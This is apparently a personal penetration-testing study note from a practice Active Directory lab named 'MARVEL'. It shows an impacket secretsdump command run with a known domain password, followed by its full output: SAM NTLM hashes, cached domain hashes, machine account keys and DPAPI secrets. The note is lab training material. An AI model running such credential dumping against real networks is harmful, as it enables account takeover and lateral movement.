# Dumping and Cracking Hashes

**dasda**

```
┌──(kali㉿kali)-[~]
└─$ secretsdump.py MARVEL.local/fcastle:"Password1"@10.0.2.6
/home/kali/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x2f26d7b5041807b439cfc2be3b7bb066
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:fd82b88db6c66dd3c2cef8f845ca2803:::
frankcastle:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
[*] Dumping cached domain logon information (domain/username:hash)
MARVEL.LOCAL/Administrator:$DCC2$10240#Administrator#c7154f935b7d1ace4c1d72bd4fb7889c: (2025-08-13 04:31:46)
MARVEL.LOCAL/fcastle:$DCC2$10240#fcastle#e6f48c2526bd594441d3da3723155f6f: (2025-08-03 17:27:27)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
MARVEL\THEPUNISHER$:aes256-cts-hmac-sha1-96:ddcc3c9b8dc4bac1e836f60ef909cb491342f4b4ed03dff68b2a9ac9e5fccf90
MARVEL\THEPUNISHER$:aes128-cts-hmac-sha1-96:565a3e21b9a72ae1d6f853619e4d7832
MARVEL\THEPUNISHER$:des-cbc-md5:5e4934f8f1fb580d
MARVEL\THEPUNISHER$:plain_password_hex:5a007900740052003500520066003500560036005600540036004900330034003f005b005b0023003f0042003a00230029006400770063006d0054003e003f0043006d003a003e00420071004a0062002800480047002d00350073003200640031007600500060007200540028006700530055006a0054004a0050003d00540031003f00240048007400480070007000560022002a0065002d00390061005d00280050003200690070003c0023003e004100520057003a0050002d00470035002000460022005c004f0022004c0021002000400041003300460062003b002e005700590022004e004a00770072002e00
MARVEL\THEPUNISHER$:aad3b435b51404eeaad3b435b51404ee:a7310a9f64a8598773252ee0675e8aae:::
[*] DPAPI_SYSTEM
dpapi_machinekey:0x70b810b6f3cea60a01c6a89983513809d549462f
dpapi_userkey:0x89d4bea229297fecdc2014e323945763f075a308
[*] NL$KM
 0000   38 E3 A7 85 C5 58 77 17  2F 56 EC 29 8A CF 67 1D   8....Xw./V.)..g.
 0010   FA 1B FD D7 34 19 60 CA  4C A7 C8 6F 2C 6B 9E C9   ....4.`.L..o,k..
 0020   A6 5C 01 EC 71 D1 07 C7  3D 5D 70 EC E9 C9 A7 74   .\..q...=]p....t
 0030   AD 34 51 33 26 AB 5A 52  3B C9 D3 3A 14 C7 9D 86   .4Q3&.ZR;..:....
NL$KM:38e3a785c55877172f56ec298acf671dfa1bfdd7341960ca4ca7c86f2c6b9ec9a65c01ec71d107c73d5d70ece9c9a774ad34513326ab5a523bc9d33a14c79d86
[*] Cleaning up...
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
```





<img src="./images/Nessus_HostDiscoveryScan.png" alt="Nessus Host Discovery Scan" width="800"/>

<!--
span style="color:green;font-weight:700;font-size:20px">
markdown color font styles
</span
-->
